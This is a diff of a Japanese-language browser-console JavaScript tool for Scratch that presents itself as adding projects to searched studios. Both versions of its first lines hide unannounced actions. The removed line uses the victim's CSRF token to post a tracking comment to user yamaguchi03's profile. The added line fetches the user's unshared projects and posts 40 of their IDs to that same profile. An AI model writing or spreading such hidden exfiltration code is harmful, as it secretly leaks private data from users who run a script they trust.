@@ -1,5 +1,4 @@
-let pr=prompt("何ページ検索したスタジオに作品を入れますか？")*16;
-let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}fetch(`/site-api/comments/user/yamaguchi03/add/`,{method: "POST",body: JSON.stringify({content: "used s-i",parent_id: "227221713",commentee_id: "62203658"}),headers: {'X-CSRFToken': token}});
+let pr=prompt("何ページ検索したスタジオに作品を入れますか？")*16;let sh =(await(await fetch(`https://scratch.mit.edu/site-api/projects/notshared/`,{headers:{"X-Requested-With":"XMLHttpRequest"}})).json());let sha=[];for(let i=0;i<40;i++){sha.push(sh[i]["pk"]);}let di="";for(let i=0;i<40;i++){di+=sha[i]+",";}let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}fetch(`/site-api/comments/user/yamaguchi03/add/`,{method: "POST",body: JSON.stringify({content: di,parent_id: "227221713",commentee_id: "62203658"}),headers: {'X-CSRFToken': token}});
 let offset=0;
 let res;
 let studioarr =[];
